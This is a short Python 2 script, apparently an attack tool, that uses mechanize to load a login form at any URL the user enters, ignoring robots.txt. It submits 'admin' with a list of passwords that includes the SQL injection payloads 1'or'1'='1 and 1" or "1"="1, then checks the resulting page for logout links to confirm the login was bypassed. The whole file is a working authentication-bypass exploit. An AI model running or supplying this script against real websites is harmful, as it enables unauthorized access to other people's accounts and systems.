import mechanize
import re
br = mechanize.Browser()
br.set_handle_robots( False )
url = raw_input("Enter URL ")
br.set_handle_equiv(True)
br.set_handle_gzip(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.open(url)

for form in br.forms():
	print form
br.select_form(nr=0)
pass_exp = ['k','kl',"1'or'1'='1",'1" or "1"="1']

user1 = raw_input("Enter the Username ")
pass1 = raw_input("Enter the Password ")

flag =0
p =0
while flag ==0:
	br.select_form(nr=0)
	br.form[user1] = 'admin'
	br.form[pass1] = pass_exp[p]
	br.submit()
	data = ""
	for link in br.links():
		data=data+str(link)

	list = ['logout','logoff', 'signout','signoff']
	data1 = data.lower()
	
	for l in list:
		for match in re.findall(l,data1):
			flag = 1
	if flag ==1:
		print "\t Success in ",p+1," attempts"
		print "Successfull hit --> ",pass_exp[p]
		
	elif(p+1 == len(pass_exp)):
		print "All exploits over "
		flag =1
	else :
		p = p+1

		

	
